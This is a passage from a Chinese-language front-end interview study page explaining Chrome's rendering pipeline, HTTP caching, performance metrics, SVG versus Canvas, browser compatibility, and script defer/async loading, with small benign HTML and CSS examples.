<li>遍历 DOM 树中的所有可见节点，并把这些节点加到布局树中</li>
<li>而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 <code>body.p.span</code> 这个元素，因为它的属性包含 <code>dispaly:none</code>，所以这个元素也没有被包进布局树</li>
</ul>
<ol start="2">
<li>布局计算</li>
</ol>
<p>现在我们有了一棵完整的布局树。那么接下来，就要计算布局树节点的坐标位置。</p>
<p>在执行布局操作的时候，会把布局运算的结果重新写回布局树中，<strong>所以布局树既是输入内容也是输出内容</strong>，这是布局阶段一个不合理的地方，因为在布局阶段并没有清晰地将输入内容和输出内容区分开来。</p>
<p>针对这个问题，Chrome 团队正在重构布局代码，下一代布局系统叫 LayoutNG，试图更清晰地分离输入和输出，从而让新设计的布局算法更加简单。</p>
<p><strong>分层</strong></p>
<p>到这里我们先总结一下前三个阶段：</p>
<p>在 HTML 页面内容被提交给渲染引擎之后，渲染引擎首先将 HTML 解析为浏览器可以理解的 DOM；然后根据 CSS 样式表，计算出 DOM 树所有节点的样式；接着又计算每个元素的几何坐标位置，并将这些信息保存在布局树中。</p>
<p>现在我们有了布局树，而且每个元素的具体位置信息都计算出来了，那么接下来是不是就要开始着手绘制页面了？</p>
<p>答案依然是否定的。</p>
<p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 <code>z-index</code> 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树（LayerTree）。</strong> 如果你熟悉 PS，相信你会很容易理解图层的概念，正是这些图层叠加在一起构成了最终的页面图像。</p>
<p>要想直观地理解什么是图层，你可以打开 Chrome 的“开发者工具”，选择“Layers”标签，就可以可视化页面的分层情况。</p>
<p>现在你知道了浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面。下面我们再来看看这些图层和布局树节点之间的关系，如文中图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fd24059335a6465ea1613451a7a9eead~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层</strong>。如上图中的 <code>span</code> 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p>
<p>那么需要满足什么条件，渲染引擎才会为特定的节点创建新的图层呢？通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</p>
<p><strong>第一点，拥有层叠上下文属性的元素会被提升为单独的一层。</strong></p>
<p>页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。你可以结合下图来直观感受下：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fda8eea299184b9aab380e42279a8c9c~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性。</p>
<p><strong>第二点，需要剪裁（clip）的地方也会被创建为图层。</strong></p>
<p>不过首先你需要了解什么是剪裁，结合下面的 HTML 代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">      <span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">200</span>;</span><br><span class="language-css">            <span class="hljs-attribute">overflow</span>:auto;</span><br><span class="language-css">            <span class="hljs-attribute">background</span>: gray;</span><br><span class="language-css">        &#125; </span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>从上图我们可以看到，document层上有A和B层，而B层之上又有两个图层。这些图层组织在一起也是一颗树状结构。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在这里我们把 div 的大小限定为 200 * 200 像素，而 <code>div</code> 里面的文字内容比较多，文字所显示的区域肯定会超出 200 * 200 的面积，这时候就产生了剪裁，渲染引擎会把裁剪文字内容的一部分用于显示在 <code>div</code> 区域，下图是运行时的执行结果：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a5e6edd290574f6f994455e7c968940f~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>出现这种裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。你可以参考下图：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4a19ec877e3b47fb8440746f72885f15~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>所以说，元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。</p>
<p><strong>图层绘制</strong></p>
<p>在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制，那么接下来我们看看渲染引擎是怎么实现图层绘制的。</p>
<p>试想一下，如果给你一张纸，让你先把纸的背景涂成蓝色，然后在中间位置画一个红色的圆，最后再在圆上画个绿色三角形。你会怎么操作呢？</p>
<p>通常，你会把你的绘制操作分解为三步：</p>
<ol>
<li>绘制蓝色背景</li>
<li>在中间绘制一个红色的圆</li>
<li>再在圆上绘制绿色三角形</li>
</ol>
<p>渲染引擎实现图层的绘制与之类似，会把一个图层的绘制拆分成很多小的<strong>绘制指令</strong>，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/08b22ddf1964485c830b63a37b4bbcf5~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，输出的内容就是这些待绘制列表。</p>
<p>你也可以打开“开发者工具”的<code>Layers</code>标签，选择<code>document</code>层，来实际体验下绘制列表，如下图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b8405bd2dbb54e1391fbf87a2492097e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。</p>
<p><strong>栅格化操作</strong></p>
<p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。你可以结合下图来看下渲染主线程和合成线程之间的关系：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/582e09ed4aab40c5bcddf1ec05b10d7b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>如上图所示，当图层的绘制列表准备好之后，主线程会把该绘制列表提交（commit）给合成线程，那么接下来合成线程是怎么工作的呢？</p>
<p>那我们得先来看看什么是视口，<strong>屏幕上页面的可见区域就叫视口（ViewPort）</strong>，通俗点来说就是，一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做视口。</p>
<p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p>
<p>基于这个原因，合成线程会将图层划分为图块（tile），这些图块的大小通常是 256x256 或者 512x512，如下图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/079265826ab141ea9d6d746c6fd45402~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>然后<strong>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图。而图块是栅格化执行的最小单位。</strong> 渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/225fb615e24d4577917460514604bb0f~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p>
<p>相信你还记得，GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8b6e16bf08df423bac9719b9efce4ab0~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。</p>
<p><strong>合成和显示</strong></p>
<p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令<code>DrawQuad</code>，然后将该命令提交给浏览器进程。</p>
<p>浏览器进程里面有一个叫 <code>viz</code> 的组件，用来接收合成线程发过来的 <code>DrawQuad</code> 命令，然后根据 <code>DrawQuad</code> 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p>
<p>到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面了。</p>
<p><strong>渲染流水线大总结</strong></p>
<p>好了，我们现在已经分析完了整个渲染流程，从 HTML 到 DOM、样式计算、布局、图层、绘制、光栅化、合成和显示。下面我用一张图来总结下这整个渲染流程：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/748f7f523d104f7e93f5c5523e6f2e13~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>结合上图，一个完整的渲染流程大致可总结为如下：</p>
<ol>
<li>渲染进程将 HTML 内容转换为能够读懂的 <strong>DOM树</strong> 结构。</li>
<li>渲染引擎将 CSS 样式表转化为浏览器可以理解的 <strong>styleSheets</strong>，计算出 DOM 节点的样式。</li>
<li>创建<strong>布局树</strong>，并计算元素的布局信息。</li>
<li>对布局树进行分层，并生成<strong>分层树</strong>。</li>
<li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li>
<li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程</strong>池中将图块转换成位图。</li>
<li>合成线程发送绘制图块命令 <code>DrawQuad</code> 给浏览器进程。</li>
<li>浏览器进程根据 <code>DrawQuad</code> 消息生成页面，并显示到显示器上。</li>
</ol>
<h5 id="面向服务的架构"><a href="#面向服务的架构" class="headerlink" title="面向服务的架构"></a>面向服务的架构</h5><p>在 2016 年，Chrome 官方团队使用“<strong>面向服务的架构</strong>”（Services Oriented Architecture，简称 <strong>SOA</strong>）的思想设计了新的 Chrome 架构。也就是说 Chrome 整体架构会朝向现代操作系统所采用的“面向服务的架构” 方向发展，原来的各种模块会被重构成独立的服务（Service），每个服务（Service）都可以在独立的进程中运行，访问服务（Service）必须使用定义好的接口，通过 IPC 来通信，从而构建<strong>一个更内聚、松耦合、易于维护和扩展的系统</strong>，更好实现 Chrome 简单、稳定、高速、安全的目标。</p>
<p>Chrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，下面是 Chrome“面向服务的架构”的进程模型图：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2bd9b0dd3ffd476fab397a7a1b40b7ee~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>同时 Chrome 还提供灵活的弹性架构，在强大性能设备上会以多进程的方式运行基础服务，但是如果在资源受限的设备上（如下图），Chrome 会将很多服务整合到一个进程中，从而节省内存占用。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/61b32945c403485d8da21ba23bc6cec8~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<h3 id="7、浏览器缓存"><a href="#7、浏览器缓存" class="headerlink" title="7、浏览器缓存"></a>7、浏览器缓存</h3><p>浏览器缓存是一种用于提高网页加载性能和减少网络流量的技术。它通过将网页的资源（如HTML、CSS、JavaScript、图像等）存储在本地，以便在用户再次访问相同页面时可以更快地加载这些资源。浏览器缓存可以减少服务器的负载，加速页面加载速度，提高用户体验。</p>
<p>浏览器缓存主要有两种类型：<strong>HTTP缓存</strong>和<strong>localStorage&#x2F;sessionStorage</strong>。</p>
<ol>
<li><p><strong>HTTP缓存</strong>：</p>
<p>HTTP缓存是通过HTTP协议来管理的，它使用HTTP响应头来控制浏览器是否缓存资源以及缓存的策略。以下是HTTP缓存的主要特点和策略：</p>
<ul>
<li><p><strong>Cache-Control和Expires</strong>：HTTP响应头中的<code>Cache-Control</code>和<code>Expires</code>字段指示浏览器缓存资源的有效期。<code>Cache-Control</code>可以设置为<code>max-age</code>来指定缓存的秒数，而<code>Expires</code>设置一个具体的过期日期时间。浏览器会根据这些字段来决定是否使用缓存。</p>
</li>
<li><p><strong>Last-Modified和If-Modified-Since</strong>：服务器可以在响应头中发送<code>Last-Modified</code>字段，表示资源的最后修改日期。当浏览器再次请求资源时，可以使用<code>If-Modified-Since</code>字段来检查资源是否有更新。如果没有更新，服务器返回304状态码，浏览器将使用缓存副本。</p>
</li>
<li><p><strong>ETag和If-None-Match</strong>：类似于Last-Modified，服务器可以发送<code>ETag</code>字段，它是一个唯一的资源标识符。当浏览器再次请求资源时，可以使用<code>If-None-Match</code>字段来检查资源是否有更新。如果没有更新，服务器返回304状态码，浏览器将使用缓存副本。</p>
</li>
<li><p><strong>强制刷新和硬刷新</strong>：用户可以通过强制刷新或硬刷新来忽略缓存并重新加载页面或资源。</p>
</li>
</ul>
</li>
<li><p><strong>localStorage和sessionStorage</strong>：</p>
<p><code>localStorage</code>和<code>sessionStorage</code>是Web Storage API的一部分，它们允许网页在浏览器中存储键值对数据。这些数据是基于域名的，可以在同一浏览器中的不同页面之间共享。</p>
<ul>
<li><p><strong>localStorage</strong>：数据存储在本地，不会过期，除非用户手动清除或网页使用JavaScript代码删除它们。</p>
</li>
<li><p><strong>sessionStorage</strong>：数据存储在会话级别，当会话结束时（通常是关闭浏览器标签或窗口时）将自动删除。</p>
</li>
</ul>
<p>这些存储方式通常用于存储用户的本地数据、设置选项等，并不适用于缓存网页资源。</p>
</li>
</ol>
<p>使用浏览器缓存时，需要注意以下几点：</p>
<ul>
<li><p><strong>缓存策略</strong>：在HTTP响应头中明确设置适当的缓存策略，以确保资源能够根据需求进行缓存或重新加载。</p>
</li>
<li><p><strong>缓存清除</strong>：浏览器缓存可以被用户手动清除，因此不应该依赖于缓存来存储敏感信息。</p>
</li>
<li><p><strong>版本控制</strong>：当资源发生更改时，确保使用版本号或其他方法来强制浏览器获取新的资源而不是使用旧的缓存。</p>
</li>
<li><p><strong>浏览器开发工具</strong>：浏览器开发工具通常提供了查看和管理缓存的功能，可以用来调试和验证缓存设置。</p>
</li>
<li><p><strong>缓存控制头</strong>：了解和正确配置HTTP响应头中的缓存控制字段，例如<code>Cache-Control</code>、<code>Expires</code>、<code>ETag</code>等。</p>
</li>
</ul>
<p>浏览器缓存是一项强大的性能优化技术，但需要正确配置和管理，以确保它的行为符合你的需求。</p>
<h3 id="8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？"><a href="#8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？" class="headerlink" title="8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？"></a>8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？</h3><p>Web前端性能指标是衡量一个网站或Web应用程序加载速度、交互性和用户体验的关键因素。以下是一些常见的Web前端性能指标及其解释：</p>
<ol>
<li>首次绘制（FP，First Paint）：页面在用户设备上开始渲染的时间点。这个指标可以用来衡量页面加载速度的初步感知。</li>
<li>首次内容绘制（FCP，First Contentful Paint）：页面上的任何内容（如文字、图片等）首次渲染的时间点。这个指标可以用来衡量用户看到页面内容的速度。</li>
<li>首次有效绘制（FMP，First Meaningful Paint）：页面主要内容呈现给用户的时间点。这个指标可以用来衡量页面的视觉完整度。</li>
<li>首次输入延迟（FID，First Input Delay）：用户首次与页面交互（如点击按钮、输入等）所需时间。这个指标可以用来衡量页面的交互性。</li>
<li>速度指数（SI，Speed Index）：描述页面加载过程中的视觉体验的一个指标。速度指数越低，用户体验越好。</li>
<li>大致加载时间（TTFB，Time To First Byte）：从用户发出请求到接收到服务器响应的第一个字节所需的时间。这个指标可以用来衡量网络延迟和服务器处理速度。</li>
<li>页面完全加载时间（Load Time）：从用户发出请求到页面完全加载所需的时间。这个指标可以用来衡量页面加载速度的综合体验。</li>
<li>页面体积：页面的所有资源（HTML、CSS、JavaScript等）的总大小。页面体积越小，加载速度越快。</li>
<li>请求次数：加载页面所需的网络请求次数。请求次数越少，加载速度越快。</li>
<li>首次CPU空闲时间（First CPU Idle）：页面首次达到CPU空闲状态的时间点。这个指标可以用来衡量页面在何时可以响应用户输入。</li>
<li>最大潜在首次输入延迟（Max Potential FID）：一个预测性指标，衡量在页面首次可交互之前可能发生的最大输入延迟。</li>
<li>累计布局偏移（CLS，Cumulative Layout Shift）：页面在加载过程中元素位置变化的总和。这个指标可以用来衡量页面的视觉稳定性。</li>
</ol>
<h3 id="9、svg和canvs的区别"><a href="#9、svg和canvs的区别" class="headerlink" title="9、svg和canvs的区别"></a>9、svg和canvs的区别</h3><p>SVG（可缩放矢量图形）和Canvas是两种用于在Web上绘制图形的不同技术，它们具有不同的工作原理和用途，以下是它们的主要区别：</p>
<ol>
<li><p><strong>图形绘制方式：</strong></p>
<ul>
<li><strong>SVG：</strong> SVG是一种基于XML的矢量图形格式，它使用XML标签来描述图形元素，如圆形、矩形、线条等。SVG图形是分层的，每个图形元素都是独立的DOM节点，可以通过CSS和JavaScript进行修改和控制。</li>
<li><strong>Canvas：</strong> Canvas是一个HTML元素，它提供了一个2D绘图环境，可以使用JavaScript绘制位图图形。在Canvas上绘制图形是通过绘制像素来实现的，没有明确的图形元素可供操作，所有图形都是像素级的。</li>
</ul>
</li>
<li><p><strong>分辨率：</strong></p>
<ul>
<li><strong>SVG：</strong> SVG图形是矢量图形，它们可以无限缩放而不失真，因为它们是基于数学公式描述的。SVG图形适合在不同分辨率的设备上显示。</li>
<li><strong>Canvas：</strong> Canvas绘制的图形是像素级的位图，它们的分辨率是固定的。在高分辨率设备上显示Canvas图形可能会导致图像失真或模糊。</li>
</ul>
</li>
<li><p><strong>互动性：</strong></p>
<ul>
<li><strong>SVG：</strong> 由于SVG图形是基于DOM元素的，可以轻松地添加事件监听器，使图形具有互动性，例如点击、悬停和拖拽。</li>
<li><strong>Canvas：</strong> Canvas上的图形通常需要更多的JavaScript编程来实现互动性，因为它们是位图，没有内置的事件处理。</li>
</ul>
</li>
<li><p><strong>复杂性：</strong></p>
<ul>
<li><strong>SVG：</strong> 对于复杂的图形，特别是需要频繁更新的图形，SVG通常更容易管理和维护，因为它提供了高级的文档结构和操作方法。</li>
<li><strong>Canvas：</strong> 对于大规模的位图绘制或需要动画的场景，Canvas可能更高效，但也更复杂，因为您需要自行处理所有绘制和更新逻辑。</li>
</ul>
</li>
<li><p><strong>适用场景：</strong></p>
<ul>
<li><strong>SVG：</strong> 适合用于绘制复杂的、交互式的矢量图形，例如图表、地图、可缩放的图标等。</li>
<li><strong>Canvas：</strong> 适合用于绘制大规模位图、游戏、动画和需要频繁绘制的图形。</li>
</ul>
</li>
</ol>
<p>综上所述，SVG和Canvas各有其优势和适用场景。选择使用哪种技术取决于您的具体需求和项目性质。在某些情况下，它们也可以结合使用，以充分发挥各自的优势。例如，您可以使用Canvas来绘制复杂的位图背景，并在上面使用SVG来添加交互式元素。</p>
<h3 id="10、处理浏览器兼容性问题"><a href="#10、处理浏览器兼容性问题" class="headerlink" title="10、处理浏览器兼容性问题"></a>10、处理浏览器兼容性问题</h3><p>在前端开发中，处理浏览器兼容性问题是一项重要的任务。浏览器兼容性问题可以涵盖多个方面，包括样式和DOM操作。以下是处理浏览器兼容性问题时常见的样式和DOM操作方面的注意事项和解决方法：</p>
<p><strong>样式兼容性：</strong></p>
<ol>
<li><p><strong>CSS前缀：</strong> 不同浏览器可能需要不同的CSS前缀，例如 <code>-webkit-</code>、<code>-moz-</code>、<code>-ms-</code> 等。使用CSS预处理器如Sass或自动前缀工具可以自动添加所需的前缀。</p>
</li>
<li><p><strong>Flexbox和Grid布局：</strong> Flexbox和Grid布局是强大的布局工具，但不同浏览器对其支持不同。在使用这些新布局时，确保检查并提供备用布局选项或使用Polyfill。</p>
</li>
<li><p><strong>CSS Grid布局：</strong> 对于一些老版本的浏览器，可能需要使用旧版本的Grid布局规范（如MS Grid）。</p>
</li>
<li><p><strong>CSS属性和值：</strong> 某些CSS属性和值在不同浏览器中有不同的支持。使用caniuse.com等工具来检查属性和值的兼容性，或使用Polyfill来填充不兼容的功能。</p>
</li>
</ol>
<p><strong>DOM操作兼容性：</strong></p>
<ol>
<li><p><strong>事件处理：</strong> 不同浏览器可能对事件处理有不同的方式。使用现代的事件绑定方法（<code>addEventListener</code>）以确保跨浏览器兼容性。</p>
</li>
<li><p><strong>DOM操作：</strong> 不同浏览器可能对DOM操作有不同的实现和性能。在进行DOM操作时，尽量避免频繁的重绘和回流，以提高性能。</p>
</li>
<li><p><strong>跨浏览器API：</strong> 使用库或框架（如jQuery）可以帮助处理不同浏览器之间的DOM操作差异，但要注意不要滥用这些工具，以免引入额外的性能开销。</p>
</li>
<li><p><strong>Polyfill和垫片（Shim）：</strong> 对于不支持新特性的旧浏览器，可以考虑使用Polyfill或Shim来提供相同的功能。例如，Babel可以将ES6代码转换为ES5，以在老版本浏览器上运行。</p>
</li>
<li><p><strong>浏览器特定的检测和分支：</strong> 在代码中使用浏览器特定的检测和分支，以根据不同浏览器执行不同的操作。这可以通过<code>navigator.userAgent</code>或Modernizr等工具来实现。</p>
</li>
</ol>
<p>总之，处理样式和DOM操作的浏览器兼容性问题需要仔细的测试和策略。通常情况下，使用现代的Web标准和工具，并根据需要提供备用解决方案，可以帮助确保网站在各种浏览器和设备上良好运行。同时，不断跟踪Web标准和浏览器的变化，以保持对最新兼容性问题的了解。</p>
<h4 id="webkit-、-moz-和-ms"><a href="#webkit-、-moz-和-ms" class="headerlink" title="-webkit-、-moz- 和 -ms-"></a><code>-webkit-</code>、<code>-moz-</code> 和 <code>-ms-</code></h4><p><code>-webkit-</code>、<code>-moz-</code> 和 <code>-ms-</code> 是CSS中的前缀（prefix）或厂商前缀（vendor prefix），用于指示不同浏览器对某些CSS属性或功能的实验性支持或私有实现。这些前缀通常用于确保在不同浏览器中获得一致的外观和行为，尤其是在新的CSS功能尚未成为标准之前。</p>
<p>以下是这些常见的浏览器前缀的解释：</p>
<ol>
<li><strong><code>-webkit-</code>：</strong> 这是用于WebKit引擎的前缀，WebKit引擎被用于Safari浏览器、Google Chrome浏览器以及一些其他浏览器。您可以在这些浏览器中使用<code>-webkit-</code>前缀来应用某些CSS属性，以确保在这些浏览器中正确渲染。</li>
<li><strong><code>-moz-</code>：</strong> 这是用于Mozilla Firefox浏览器的前缀，您可以在Firefox中使用<code>-moz-</code>前缀来应用某些CSS属性，以确保在Firefox中正确渲染。</li>
<li><strong><code>-ms-</code>：</strong> 这是用于Microsoft Internet Explorer浏览器的前缀，您可以在早期版本的IE中使用<code>-ms-</code>前缀来应用某些CSS属性，以确保在这些浏览器中正确渲染。不过，随着IE的逐渐淘汰，对<code>-ms-</code>前缀的需求也减少了。</li>
</ol>
<h3 id="11、defer和async的区别"><a href="#11、defer和async的区别" class="headerlink" title="11、defer和async的区别"></a>11、defer和async的区别</h3><p><code>&lt;script&gt;</code> 标签的 <code>defer</code> 和 <code>async</code> 属性是用于控制脚本的加载和执行方式的两种不同方式：</p>
<ol>
<li><strong><code>async</code> 属性：</strong><ul>
<li><code>async</code> 属性用于异步加载脚本。当浏览器遇到带有 <code>async</code> 属性的 <code>&lt;script&gt;</code> 标签时，它会继续解析HTML，同时开始下载脚本文件。</li>
<li>一旦脚本文件下载完成，浏览器会立即执行脚本，而不会等待页面的解析完成。这意味着脚本的执行可能会在页面的其余内容加载和解析之前开始。</li>
<li><code>async</code> 适用于那些不依赖于页面解析顺序并且可以在任何时候执行的脚本，例如用于统计分析或广告的脚本。</li>
</ul>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong><code>defer</code> 属性：</strong><ul>
<li><code>defer</code> 属性也用于异步加载脚本，但有一些重要区别。当浏览器遇到带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 标签时，它会继续解析HTML，同时下载脚本文件。</li>
<li>但与 <code>async</code> 不同，脚本的执行会被推迟到页面解析完成之后（<code>DOMContentLoaded</code> 事件之前）进行。这意味着脚本不会阻止页面的渲染和加载。</li>
<li><code>defer</code> 适用于那些需要在页面加载完成后执行的脚本，通常用于初始化应用程序或操作文档内容。</li>
</ul>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>总结一下：</p>
<ul>
<li>如果脚本不依赖于页面解析顺序，并且可以立即执行，可以使用 <code>async</code>。</li>
<li>如果脚本需要等待页面解析完成后执行，可以使用 <code>defer</code>，它通常更适合将脚本放在页面底部，以优化性能。</li>
<li>如果不使用 <code>async</code> 或 <code>defer</code>，脚本会按照它们在HTML中的顺序进行下载和执行，可能会阻止页面加载或渲染。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20231005150702646-20231005%2015:07:04.png" srcset="/blog/img/loading.gif" lazyload alt="image-20231005150702646"></p>
<h5 id="onload和domcontentloaded的区别"><a href="#onload和domcontentloaded的区别" class="headerlink" title="onload和domcontentloaded的区别"></a>onload和domcontentloaded的区别</h5><p><code>onload</code> 和 <code>DOMContentLoaded</code> 是两个不同的事件，用于在页面加载过程中进行处理，它们之间有以下区别：</p>
<ol>
<li><p><strong>触发时机：</strong></p>
<ul>
<li><code>DOMContentLoaded</code> 事件：当整个HTML文档被完全解析和加载，而不需要等待外部资源（如样式表、图片和媒体文件）下载完成时触发。</li>
<li><code>onload</code> 事件：当整个页面及其所有依赖的外部资源都已经加载完成时触发，包括样式表、图片、媒体文件等。</li>
</ul>
</li>
<li><p><strong>执行顺序：</strong></p>
<ul>
<li><code>DOMContentLoaded</code> 事件通常在页面解析完成后立即触发，这意味着它可能会在外部资源加载完成之前发生。</li>
<li><code>onload</code> 事件则会等待整个页面及其依赖的资源加载完成后才触发。这意味着它通常会在 <code>DOMContentLoaded</code> 之后发生。</li>
</ul>
</li>
